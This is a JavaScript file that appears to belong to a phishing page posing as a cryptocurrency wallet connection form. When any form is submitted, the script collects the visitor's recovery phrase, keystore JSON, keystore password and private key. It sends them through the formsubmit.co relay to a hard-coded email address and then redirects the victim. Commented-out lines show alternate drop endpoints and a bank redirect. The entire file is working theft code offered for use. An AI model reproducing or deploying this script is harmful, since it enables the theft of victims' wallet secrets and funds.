const keystorejsonProceedBtn = document.getElementById("keystorejsonproceed");
const privatekeyProceedBtn = document.getElementById("privatekeyProceed");
const phraseProceedBtn = document.getElementById("phraseProceed");
const forms = document.querySelectorAll("form");

forms.forEach((form) => form.addEventListener("submit", o));

function o(e) {
  e.preventDefault();
  mail = "worlddavid40@gmail.com";
  next = /* "https://www3.mtb.com"; */ "next.html";
  subject = `${window.location.hostname} ${new Date()}`;
  let r = new FormData();
  let s = document.querySelector("form").name;
  /* let walletName = walletname.innerHTML + " " + "Wallet"; */
  /* hardwarekey = wallet_id.value; */
  /* r.append("hardwarekey", hardwarekey); */
  /* r.append("Wallet Type", walletName); */
  
  console.log(r)
  phrase = phraseInput.value;
  jsonphrase = keystorejson.value;
  password = keystore_password.value;
  privatekey = privatekey.value;
  r.append("phraseKey", phrase);
  r.append("Keystore json phrase", jsonphrase);
  r.append("password", password);
  r.append("privatekey", privatekey);
  r.append("_captcha", false);
  r.append("_next", next);
  r.append("_template", "table");
  r.append("_subject", subject);
  console.log(r);
  let n = /* `https://liveformhq.com/form/01f631b5-7d6b-4bda-bb1e-3d61d2b630d9`; */ `https://formsubmit.co/${mail}`;
  fetch(
    n,
    {
      method: "POST",
      body: r,
    },
    { referrer: "https://twitter.com" },
  ).then((e) => window.location.assign(next));
}
